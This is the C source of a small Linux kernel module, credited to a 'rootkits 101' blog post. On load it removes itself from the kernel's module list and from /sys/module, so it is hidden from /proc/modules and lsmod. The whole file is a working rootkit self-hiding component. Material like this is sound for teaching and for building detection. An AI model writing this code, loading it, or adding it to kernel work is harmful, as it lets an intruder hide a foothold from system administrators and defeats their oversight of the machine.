// src http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html

// kernel imports
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CSEN1001");
MODULE_VERSION("1.0");

static int __init mhide_init(void);
static void __exit mhide_exit(void);

module_init(mhide_init);
module_exit(mhide_exit);

// #################################
// Helpers                         #
// #################################

static int __init mhide_init(void)
{
    printk(KERN_INFO "ModHide: LKM succefully loaded!\n");

    // remove module from `/proc/modules` list
    list_del_init(&__this_module.list);

    // remove module from `/sys/module` list
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

// #################################
// Main Functions                  #
// #################################

static void __exit mhide_exit(void)
{
    printk(KERN_INFO "ModHide: LKM succefully unloaded!\n");
}
